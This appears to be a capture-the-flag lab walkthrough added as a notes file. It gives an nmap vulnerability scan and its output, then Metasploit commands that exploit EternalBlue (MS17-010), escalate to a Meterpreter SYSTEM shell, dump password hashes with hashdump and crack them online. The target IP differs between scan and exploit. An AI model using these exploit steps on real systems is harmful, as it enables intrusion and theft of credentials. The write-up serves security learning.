@@ -1,0 +1,111 @@
+ETERNAL BLUE
+
+NMAP SCAN:
+
+	sudo nmap --script=vuln -sV -Pn 10.10.118.9
+
+RESULT:
+
+Nmap scan report for 10.10.118.9
+Host is up (0.20s latency).
+Not shown: 991 closed ports
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ms-wbt-server Microsoft Terminal Service
+| rdp-vuln-ms12-020: 
+|   VULNERABLE:
+|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2012-0152
+|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
+|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
+|           
+|     Disclosure date: 2012-03-13
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
+|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
+|   
+|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2012-0002
+|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
+|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
+|           
+|     Disclosure date: 2012-03-13
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
+|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
+|_ssl-ccs-injection: No reply from server (TIMEOUT)
+|_sslv2-drown: 
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49158/tcp open  msrpc         Microsoft Windows RPC
+49160/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+
+
+VULNERABILITY IS ms17-010
+
+OPEN METASPLOIT:
+
+msfconsole
+
+use exploit/windows/smb/ms17_010_eternalblue
+
+options
+
+set RHOST  10.10.118.19
+
+exploit
+
+YOU GET A WINDOWS SHELL, PUT IT TO BACKGROUND AND THEN UPGRADE SHELL TO METERPRETER
+
+use /post/multi/manage/shell_to_meterpreter
+
+options 
+
+ONLY OPTION THAT NEEDS TO BE SET IS THE SESSION ID OF THE SHELL TO UPGRADE WHICH IS ONE IN MY CASE
+
+set session 1
+
+run
+
+SUCCESSFUL YOU GET A METERPRETER SHELL TRY SOME COMMANDS
+
+getsystem
+
+ls
+
+USE HASHDUMP COMMAND TO DUMP ALL OF THE PASSWORDS ON THE MACHINE
+
+hashdump 
+
+COPY THE HASH AND THEN USE ONLINE CRACKING SITE SUCH AS CRACK STATION TO CRACK THE HASH AND OBTAIN THE PASSWORD
+
+NOW TO SEARCH THE FLAG USE 
+
+search flag*.*
+
+TO LIST LOCATIONS OF THE FLAGS THE CAT THEM
